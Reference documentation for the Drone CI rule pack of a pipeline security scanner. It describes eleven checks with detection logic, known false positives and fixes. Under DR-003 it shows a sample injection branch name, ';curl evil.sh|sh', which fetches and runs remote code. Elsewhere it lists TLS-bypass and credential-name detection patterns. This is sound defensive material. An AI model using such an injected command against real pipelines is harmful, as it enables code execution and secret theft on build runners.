# Drone CI provider

Parses ``.drone.yml`` / ``.drone.yaml`` documents on disk. Drone
pipelines are multi-document YAML; each document is a top-level
pipeline gated by a ``kind: pipeline`` discriminator and a ``type:``
(``docker``, ``kubernetes``, ``ssh``, ``exec``, ``digitalocean``).
The rule pack focuses on the container-flavored types
(``docker`` / ``kubernetes``); ``ssh`` / ``exec`` / ``digitalocean``
pipelines have no container surface and most rules pass-by-default
on them.

## Producer workflow

```bash
# --drone-path is auto-detected when .drone.yml or .drone.yaml exists at cwd.
pipeline_check --pipeline drone

# ...or pass it explicitly.
pipeline_check --pipeline drone --drone-path .drone.yml

# A directory of services with one .drone.yml each.
pipeline_check --pipeline drone --drone-path services/
```

All other flags (`--output`, `--severity-threshold`, `--checks`,
`--standard`, ...) behave the same as with the other providers.

### Drone-specific checks

- **DR-002**, ``privileged: true`` is a step-scoped switch that
  removes the container's syscall and capability boundary,
  giving the step kernel-level access to the agent host. Most
  workloads reaching for it can use a rootless alternative
  (``buildx``, ``kaniko``, ``buildah``); when DR-002 fires,
  treat it as a build-system review item rather than a quick
  fix.
- **DR-003**, Drone substitutes ``${DRONE_*}`` template
  variables *before* the shell parses the script. Author-
  controllable variables (``DRONE_COMMIT_MESSAGE``,
  ``DRONE_PULL_REQUEST_TITLE``, branch / repo names in fork
  PRs, tag annotations) are tainted; an unquoted use is a
  command-injection primitive. Same model as TKN-003 / ARGO-005
  / BK-003 in this catalog.
- **DR-005**, plugin steps (steps with a ``settings:`` block)
  are a sharper attack surface than ordinary steps because
  Drone passes every ``settings:`` key to the plugin as an env
  var, including any secret references. The rule fires
  specifically on plugin steps using a floating image tag, so
  a maintainer can ratchet plugin pinning up first.

## What it covers

11 checks · 0 have an autofix patch (``--fix``).

| Check | Title | Severity | Fix |
|-------|-------|----------|-----|
| [DR-001](#dr-001) | Step image not pinned to a digest | <span class="pg-sev pg-sev--high">HIGH</span> |  |
| [DR-002](#dr-002) | Step runs with privileged: true | <span class="pg-sev pg-sev--high">HIGH</span> |  |
| [DR-003](#dr-003) | Untrusted Drone template variable in shell command | <span class="pg-sev pg-sev--high">HIGH</span> |  |
| [DR-004](#dr-004) | Literal credential in step environment / settings | <span class="pg-sev pg-sev--critical">CRITICAL</span> |  |
| [DR-005](#dr-005) | Plugin step uses a floating image tag | <span class="pg-sev pg-sev--high">HIGH</span> |  |
| [DR-006](#dr-006) | TLS verification disabled in step commands | <span class="pg-sev pg-sev--high">HIGH</span> |  |
| [DR-007](#dr-007) | Step mounts a sensitive host path | <span class="pg-sev pg-sev--high">HIGH</span> |  |
| [DR-008](#dr-008) | Step uses ``pull: never`` (skips registry verification) | <span class="pg-sev pg-sev--medium">MEDIUM</span> |  |
| [DR-009](#dr-009) | Cache plugin key embeds an attacker-controllable Drone variable | <span class="pg-sev pg-sev--high">HIGH</span> |  |
| [DR-010](#dr-010) | Step commands run unpinned package installs | <span class="pg-sev pg-sev--medium">MEDIUM</span> |  |
| [DR-011](#dr-011) | node map interpolates attacker-controllable Drone variable | <span class="pg-sev pg-sev--high">HIGH</span> |  |

---

<div class="pg-rule pg-rule--high" markdown>

## DR-001: Step image not pinned to a digest { #dr-001 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-3</span> <span class="pg-tag pg-tag--esf">ESF-S-IMMUTABLE</span> <span class="pg-tag pg-tag--cwe">CWE-1357</span>
</div>

Detection mirrors the GL-001 / JF-009 / ADO-009 / CC-003 family: any container ``image:`` whose ref doesn't end in ``@sha256:<64 hex>`` fires. ``:latest`` and missing-tag references emit the strongest message; a specific-version tag (``golang:1.21.5``) still fires but can be fixed with a one-line digest swap. The rule scopes itself to ``type: docker`` / ``kubernetes`` pipelines (the container-flavored ones); ``ssh`` / ``exec`` / ``digitalocean`` pipelines have no ``image:`` field and pass-by-default.

**Known false-positive modes**

- Local-build images (``image: my-org/build-tools:dev`` produced upstream in the same pipeline) sometimes can't be digest-pinned because the digest depends on the build. Suppress via ignore-file scoped to the specific step name when this is the deliberate shape; the floating-tag risk still applies to every public-registry pull.

<div class="pg-rule__rec" markdown>

**Recommended action**

Pin every step ``image:`` (and every ``services:`` image) to ``@sha256:<digest>``. Drone resolves the image ref at run time, so a tag like ``golang:1.21`` resolves against whatever the registry currently serves and a compromised registry can swap content under a fixed tag. Capture the digest once with ``docker buildx imagetools inspect golang:1.21`` (or ``crane digest golang:1.21``) and update the digest deliberately when the upstream version moves.

</div>

</div>

<div class="pg-rule pg-rule--high" markdown>

## DR-002: Step runs with privileged: true { #dr-002 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-5</span> <span class="pg-tag pg-tag--esf">ESF-D-RUNTIME-HARDENING</span> <span class="pg-tag pg-tag--esf">ESF-D-LEAST-PRIV</span> <span class="pg-tag pg-tag--cwe">CWE-269</span> <span class="pg-tag pg-tag--cwe">CWE-250</span>
</div>

Drone's ``privileged: true`` is a step-scoped switch that maps directly to ``docker run --privileged``. The rule fires on either steps or services declaring the flag. The agent admin can also globally allow / deny privileged steps via the trusted-flag on the repository, the rule doesn't try to reach into Drone's server config and assumes the worst (a malicious or accidentally-trusted repo) so a ``privileged: true`` in source is always a finding.

<div class="pg-rule__rec" markdown>

**Recommended action**

Drop ``privileged: true`` from the step. The flag removes the container's syscall and capability boundary, giving the step kernel-level access to the agent host. Most workloads that reach for it are Docker-in-Docker pipelines that can use a rootless alternative (``buildx``, ``kaniko``, ``buildah --isolation=chroot``) instead. If the workload genuinely needs syscalls, scope down with explicit ``cap_add: [SYS_ADMIN]`` and an isolated runner pool, rather than blanket privileged.

</div>

</div>

<div class="pg-rule pg-rule--high" markdown>

## DR-003: Untrusted Drone template variable in shell command { #dr-003 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-4</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-1</span> <span class="pg-tag pg-tag--esf">ESF-D-RUNTIME-HARDENING</span> <span class="pg-tag pg-tag--cwe">CWE-78</span>
</div>

User-controllable substitution sources flagged by this rule:

- ``DRONE_COMMIT_MESSAGE`` / ``DRONE_COMMIT_AUTHOR*``
- ``DRONE_PULL_REQUEST_TITLE`` / ``DRONE_PULL_REQUEST_BRANCH``
- ``DRONE_TAG_MESSAGE`` (tag annotations are author-controlled)
- ``DRONE_BRANCH`` / ``DRONE_SOURCE_BRANCH`` / ``DRONE_TARGET_BRANCH`` (branch names are pushable, so an attacker can craft a name like ``;curl evil.sh|sh``)
- ``DRONE_REPO_*`` (in fork PRs the repo metadata comes from the fork)

The rule only fires on **unquoted** uses inside a command body. Quoted (``"${DRONE_*}"``) or single-quoted uses are safe in POSIX shell because the substitution runs after Drone's templating but the shell still tokenises the expanded value as a single argument. Same model as the Tekton TKN-003 / Argo ARGO-005 / Buildkite BK-003 rules in this catalog.

**Known false-positive modes**

- Trusted-only Drone variables (``DRONE_BUILD_NUMBER``, ``DRONE_BUILD_STATUS``, ``DRONE_REPO_NAMESPACE`` for non-fork repos) aren't user-controllable and are safe to interpolate unquoted. Drone-template syntax can also appear in YAML strings outside ``commands:``; this rule only scopes itself to step command bodies, so an unquoted use in (say) ``settings.message:`` doesn't fire here, those land under DR-004 / SBOM-style audits.

<div class="pg-rule__rec" markdown>

**Recommended action**

Treat user-controllable Drone template variables as tainted. Drone substitutes ``${DRONE_*}`` tokens *before* the shell parses the command, so an unquoted use is a textbook command-injection primitive. The safe pattern is to copy the value into the step's ``environment:`` block (``MSG: ${DRONE_PULL_REQUEST_TITLE}``) and reference the env var quoted in the command (``echo "$MSG"``). Drone's own docs call out the same hardening for build-message / commit-author fields.

</div>

</div>

<div class="pg-rule pg-rule--critical" markdown>

## DR-004: Literal credential in step environment / settings { #dr-004 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-6</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-7</span> <span class="pg-tag pg-tag--esf">ESF-D-SECRETS</span> <span class="pg-tag pg-tag--cwe">CWE-798</span> <span class="pg-tag pg-tag--cwe">CWE-321</span>
</div>

The rule fires on credential-shaped values where the key name suggests a secret (``token``, ``password``, ``secret``, ``key``, ``apikey``, ``api_key``, ``access_key``, ``private_key``, ``auth``, ``credentials``) and the value is a plain string rather than a ``{from_secret: NAME}`` reference. AWS-style ``AKIA...`` keys also fire regardless of the key name (matching the AWS canonical access-key shape). Empty strings and the explicit literal ``null`` are not flagged: an empty value is a configuration bug, not a leaked credential. Same model as BK-002 / TKN-005 / ARGO-006 in this catalog.

**Known false-positive modes**

- Configuration values that happen to use a credential-shaped key name but never carry a secret (``DOCKER_CONFIG=/dev/null`` to suppress credential loading) sometimes trip this rule. Suppress via ignore-file scoped to the specific step name when this is the deliberate shape; the broader credential-vocab match still catches real leaks elsewhere in the pipeline.

<div class="pg-rule__rec" markdown>

**Recommended action**

Move every literal credential into a Drone secret (``drone secret add --repository OWNER/REPO --name MY_SECRET --value ...``) and reference it via the ``from_secret:`` mechanism: ``MY_SECRET: { from_secret: MY_SECRET }``. The same applies to plugin ``settings:`` blocks. Drone redacts ``from_secret`` values from log output but does NOT redact literals, so a pasted token in source ends up in the build log indefinitely.

</div>

</div>

<div class="pg-rule pg-rule--high" markdown>

## DR-005: Plugin step uses a floating image tag { #dr-005 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-3</span> <span class="pg-tag pg-tag--esf">ESF-S-IMMUTABLE</span> <span class="pg-tag pg-tag--esf">ESF-D-RUNTIME-HARDENING</span> <span class="pg-tag pg-tag--cwe">CWE-1357</span> <span class="pg-tag pg-tag--cwe">CWE-829</span>
</div>

Drone treats a step as a plugin when it has a ``settings:`` block. The ``image:`` field still names the container that runs, and the same supply-chain argument as DR-001 applies; this rule fires specifically on plugin steps using a floating tag (``:latest``, no tag, or a non-version-shaped tag) rather than every unpinned image, so a maintainer weighing trade-offs can ratchet plugin pinning up first. A pinned-version tag (``plugins/docker:20.13.0``) passes this rule but still trips DR-001 for the wider supply-chain hardening.

**Known false-positive modes**

- Internal-registry plugins built and pushed by the same pipeline (``image: my-org/internal-plugin:dev`` produced upstream) sometimes can't be exact-pinned. Suppress via ignore-file scoped to the specific step name when this is the deliberate shape.

<div class="pg-rule__rec" markdown>

**Recommended action**

Pin every plugin step's ``image:`` to ``@sha256:<digest>`` or, at minimum, a specific version tag (``plugins/docker:20.13.0`` rather than ``plugins/docker:latest`` or ``plugins/docker``). Plugin steps are a sharper attack surface than ordinary steps because Drone passes every ``settings:`` key to the plugin as an environment variable, including any secret references; a malicious plugin replacement can exfiltrate the entire credential set the step was trusted with.

</div>

</div>

<div class="pg-rule pg-rule--high" markdown>

## DR-006: TLS verification disabled in step commands { #dr-006 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-3</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-1</span> <span class="pg-tag pg-tag--esf">ESF-D-RUNTIME-HARDENING</span> <span class="pg-tag pg-tag--cwe">CWE-295</span> <span class="pg-tag pg-tag--cwe">CWE-494</span>
</div>

Detection is the same blob-regex used by GHA-027, BK-008, JF-022, ADO-026, CC-024, and the CFN/Terraform rule packs. Matches: ``curl --insecure`` / ``-k``, ``wget --no-check-certificate``, ``pip config set global.trusted-host``, ``npm config set strict-ssl false``, ``yarn config set strict-ssl false``, ``git config http.sslverify false``, ``GIT_SSL_NO_VERIFY=1``, ``NODE_TLS_REJECT_UNAUTHORIZED=0``, ``PYTHONHTTPSVERIFY=0``, and ``GOINSECURE=...``. The rule scans every ``commands:`` entry on every step.

<div class="pg-rule__rec" markdown>

**Recommended action**

Remove TLS-bypass flags from build commands. The most common offenders are ``curl --insecure`` / ``-k`` / ``wget --no-check-certificate``, ``pip config set global.trusted-host``, ``npm config set strict-ssl false``, and ``git -c http.sslverify=false``. Each exposes the build to TLS-MITM injection of a registry-served payload, which is a textbook supply-chain attack vector. If a registry's certificate is genuinely broken, fix the registry rather than permanently disabling verification, the bypass tends to outlive the broken cert and become a permanent weakness.

</div>

</div>

<div class="pg-rule pg-rule--high" markdown>

## DR-007: Step mounts a sensitive host path { #dr-007 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-5</span> <span class="pg-tag pg-tag--esf">ESF-D-RUNTIME-HARDENING</span> <span class="pg-tag pg-tag--esf">ESF-D-LEAST-PRIV</span> <span class="pg-tag pg-tag--cwe">CWE-250</span> <span class="pg-tag pg-tag--cwe">CWE-732</span>
</div>

Drone's pipeline-level ``volumes:`` block accepts either ``temp:`` (an ephemeral tmpfs, safe) or ``host: { path: ... }`` (a bind mount of the agent's filesystem, the dangerous shape). The rule fires when any pipeline-level volume's ``host.path`` matches a sensitive prefix:

- ``/var/run/docker.sock`` — the canonical Docker-in-Docker escape; equivalent to ``--privileged`` for container takeover purposes;
- ``/var/lib/docker`` — exposes every image / container on the host;
- ``/etc`` — config + credential files;
- ``/proc`` / ``/sys`` — host kernel state;
- ``/`` — full host takeover.

The rule fires on the volume *declaration*, not on step-level mounts. A pipeline that declares a sensitive host volume but no step actually mounts it is still flagged: the declaration alone signals the agent's Drone runner is configured to permit the bind mount, which is itself a risk-shape decision worth review.

**Known false-positive modes**

- Trusted-only pipelines on a dedicated runner fleet (no fork-PR access, no untrusted contributors) sometimes deliberately mount the Docker socket for image build / push workflows. Suppress via ignore-file when this is the deliberate posture and the runner pool's isolation is documented elsewhere; the rule has no way to know whether ``trusted: true`` is set on the repo from the pipeline YAML alone.

<div class="pg-rule__rec" markdown>

**Recommended action**

Drop the host volume from the pipeline. Mounting ``/var/run/docker.sock`` from the agent host into a build container hands the container root-equivalent control over every other workload on the same agent (it can spawn arbitrary containers, including privileged ones). ``/var/lib/docker`` exposes every image and container on the host, ``/proc`` and ``/sys`` expose the host kernel state, and ``/`` (the host root) is full takeover. If the build genuinely needs Docker, run a rootless alternative (``kaniko``, ``buildah --isolation=chroot``, ``docker buildx`` against a remote builder) or use Drone's ``trusted: true`` repo flag plus a dedicated host-isolated runner pool, rather than mounting the shared host's socket.

</div>

</div>

<div class="pg-rule pg-rule--medium" markdown>

## DR-008: Step uses ``pull: never`` (skips registry verification) { #dr-008 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-3</span> <span class="pg-tag pg-tag--esf">ESF-S-IMMUTABLE</span> <span class="pg-tag pg-tag--cwe">CWE-1357</span>
</div>

Drone supports three ``pull:`` policies on a step: ``always`` (re-fetch + verify on every build, the default), ``if-not-exists`` (use cache when present, otherwise pull), and ``never`` (use cache only). The ``never`` policy is the dangerous one because it skips the digest verification an ``always`` pull would perform, and there's no out-of-band signal that the cached image is the one the manifest names. The rule fires on either steps or services declaring ``pull: never``. ``pull: if-not-exists`` is treated as acceptable: it's tolerable when paired with a digest-pinned ``image:`` (DR-001) and a deliberate operational decision; the explicit-skip case (``never``) is what TAINT-class supply-chain attacks lean on.

**Known false-positive modes**

- Air-gapped or registry-pinned environments sometimes set ``pull: never`` deliberately because the agent never has registry access in the first place. Suppress via ignore-file when this is the deliberate shape; the runner's network isolation then carries the integrity guarantee instead of the registry round-trip.

<div class="pg-rule__rec" markdown>

**Recommended action**

Drop the ``pull: never`` directive (or change it to ``pull: always`` / ``pull: if-not-exists``). ``pull: never`` tells the Drone agent to skip the registry round-trip entirely, so the agent runs whatever image bytes it cached on a previous build without re-verifying the digest. If a compromised image ever landed in the agent's local cache (a poisoned registry tag, a manual ``docker pull`` during a debug session, a co-resident workload that pulled a malicious image), the cached bytes keep running until an operator manually clears the cache. ``pull: always`` (the Drone default) re-fetches and verifies on every build; ``pull: if-not-exists`` is acceptable when the image is digest-pinned (DR-001) so the cache key is content-addressed.

</div>

</div>

<div class="pg-rule pg-rule--high" markdown>

## DR-009: Cache plugin key embeds an attacker-controllable Drone variable { #dr-009 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-1</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-3</span> <span class="pg-tag pg-tag--esf">ESF-D-INJECTION</span> <span class="pg-tag pg-tag--esf">ESF-S-IMMUTABLE</span> <span class="pg-tag pg-tag--cwe">CWE-349</span>
</div>

Drone has no first-party cache keyword; pipelines use plugin steps (``drone-cache``, ``drone-volume-cache``, ``drone-s3-cache``, etc.) configured via ``settings:``. The rule fires on any plugin step whose ``settings.cache_key`` (or related ``key``, ``mount``, ``filename``, ``restore_keys``) interpolates a tainted Drone variable. Tainted vocabulary mirrors DR-003: ``$DRONE_BRANCH``, ``$DRONE_PULL_REQUEST*``, ``$DRONE_COMMIT_*MESSAGE``, ``$DRONE_TAG_MESSAGE``, and the fork-PR-shaped ``$DRONE_REPO_*`` family. The attack model is well-documented (GHA-011 catches the same shape on the GitHub Actions side).

**Known false-positive modes**

- Plugins that namespace cache reads by branch on the *write* side and never read across branches (a deliberate cache partitioning) are technically safe, the attacker can poison their own branch's cache but can't reach the trusted-branch one. The rule has no way to verify partition boundaries at scan time; suppress via ignore-file scoped to the specific step name when the partitioning is audited.

<div class="pg-rule__rec" markdown>

**Recommended action**

Don't embed PR-controlled or branch-controlled Drone variables in cache keys. The canonical safe shape is to key on commit-stable inputs only: a checksum of the lockfile (``${DRONE_REPO_BRANCH}-${DRONE_COMMIT_SHA}`` is unique enough; ``${DRONE_BRANCH}`` alone is attacker-controllable). When two builds need to share a cache, key on the dependency manifest's hash, not on any branch / PR / repo metadata that a fork PR can shape. If a fork PR's cache write can ever be read back by a trusted-context build (the same key on a different branch), the attacker can inject malicious build artifacts into the trusted run.

</div>

</div>

<div class="pg-rule pg-rule--medium" markdown>

## DR-010: Step commands run unpinned package installs { #dr-010 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-3</span> <span class="pg-tag pg-tag--esf">ESF-S-PIN-DEPS</span> <span class="pg-tag pg-tag--esf">ESF-S-VERIFY-DEPS</span> <span class="pg-tag pg-tag--cwe">CWE-829</span> <span class="pg-tag pg-tag--cwe">CWE-1357</span>
</div>

Detection reuses the cross-provider primitives ``PKG_INSECURE_RE`` and ``PKG_NO_LOCKFILE_RE`` from ``checks/base.py``. The same rule pack already exists for GHA (``GHA-021`` / ``GHA-022``), GitLab (``GL-021`` / ``GL-022``), Bitbucket / Azure DevOps / Jenkins / CircleCI / Cloud Build / Buildkite / Tekton / Argo. Drone was the missing port; this closes the gap.

Insecure variants matched (``PKG_INSECURE_RE``): ``pip --index-url http://``, ``pip --trusted-host``, ``npm --registry http://``, ``gem --source http://``, ``nuget --Source http://``, ``cargo --index http://``. Lockfile-bypass variants (``PKG_NO_LOCKFILE_RE``): ``npm install`` (should be ``npm ci``), bare ``pip install <pkg>`` without ``-r`` or ``--require-hashes``, ``yarn install`` without ``--frozen-lockfile``, ``bundle install`` without ``--frozen``, ``cargo install``, ``go install`` without an ``@vN.N`` pin, ``poetry install`` without ``--no-update``.

**Known false-positive modes**

- Bootstrap-stage installs that intentionally pull latest (``apt-get install -y curl`` for a tooling image rebuild) sometimes legitimately bypass the lockfile. Suppress via ignore-file scoped to the specific step name when this is the deliberate shape; the broader pinning policy still covers the rest of the pipeline.

<div class="pg-rule__rec" markdown>

**Recommended action**

Pin every package install to a lockfile or a checksum-verified version. For pip, use ``pip install --require-hashes -r requirements.txt`` or ``-r requirements.txt`` with hashes baked into the lock; ``pip install <package>`` without a version pin or lockfile flag is the unsafe shape. For npm, prefer ``npm ci`` over ``npm install`` so the lockfile is load-bearing. Yarn: ``yarn install --frozen-lockfile``. Bundle: ``bundle install --frozen``. Cargo / go install: always pin to a tag or commit. Do NOT use ``--trusted-host`` / ``--no-verify`` / a non-HTTPS index URL — those bypass TLS or trust validation entirely (DR-006 covers the TLS subset; this rule covers the lockfile subset).

</div>

</div>

<div class="pg-rule pg-rule--high" markdown>

## DR-011: node map interpolates attacker-controllable Drone variable { #dr-011 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-7</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-1</span> <span class="pg-tag pg-tag--esf">ESF-D-CODE-INTEGRITY</span> <span class="pg-tag pg-tag--esf">ESF-S-RUNNER-ISOLATION</span> <span class="pg-tag pg-tag--cwe">CWE-78</span> <span class="pg-tag pg-tag--cwe">CWE-1357</span>
</div>

Drone substitutes ``${VAR}`` template tokens against the build context before the runner picks an agent. The rule walks the pipeline-level ``node:`` map (Drone doesn't expose a per-step variant) for any reference to the same author-controllable variables DR-003 tracks (``DRONE_BRANCH``, ``DRONE_TAG``, ``DRONE_PULL_REQUEST_*``, ``DRONE_COMMIT_AUTHOR*``, ``DRONE_COMMIT_MESSAGE``, ``DRONE_REPO``).

Detection is value-only and case-sensitive against the documented variable names; trusted server-controlled fields like ``DRONE_BUILD_NUMBER`` and ``DRONE_REPO_NAMESPACE`` (for non-fork repos) aren't on the tainted list. Closes parity with BK-015 / GHA-036 / GL-032 / JF-032 / ADO-030 / CC-031.

**Known false-positive modes**

- Some teams use a static prefix plus a CI-controlled tail (``node: { pool: build-${DRONE_REPO_NAME} }``) to share a runner pool across repos. ``DRONE_REPO_NAME`` is set by the server, not the pusher, so it isn't on the tainted list, but if your team has its own conventions for trusted Drone vars, suppress on the specific pipeline name.

<div class="pg-rule__rec" markdown>

**Recommended action**

Pin every ``node:`` map entry to a static literal that matches your runner-targeting policy. Drone uses ``node:`` to route a pipeline to runners with matching labels (e.g. ``node: { instance: ci-prod-amd64 }``). When the map value interpolates ``${DRONE_BRANCH}`` / ``${DRONE_PULL_REQUEST_*}`` / ``${DRONE_COMMIT_AUTHOR}``, the pusher gets to pick which runner pool runs the pipeline, including a privileged pool reserved for the deploy step. Production runner pools should also carry a label the agent itself enforces (the runner's ``DRONE_RUNNER_LABELS`` env var, plus a server-side policy on which repos can target which labels) so the rule is one layer of defense-in-depth.

</div>

</div>

---

## Adding a new Drone CI check

1. Create a new module at
   `pipeline_check/core/checks/drone/rules/drNNN_<name>.py`
   exporting a top-level `RULE = Rule(...)` and a `check(pipeline: Pipeline) -> Finding`
   function. The orchestrator auto-discovers `RULE` and calls `check`
   with the ``Pipeline``.
2. Add a mapping for the new ID in
   `pipeline_check/core/standards/data/owasp_cicd_top_10.py` (and any
   other standard that applies).
3. Drop unsafe/safe snippets at
   `tests/fixtures/per_check/drone/DR-NNN.{unsafe,safe}.yml`
   and add a `CheckCase` entry in
   `tests/test_per_check_real_examples.py::CASES`.
4. Regenerate this doc:

   ```bash
   python scripts/gen_provider_docs.py drone
   ```
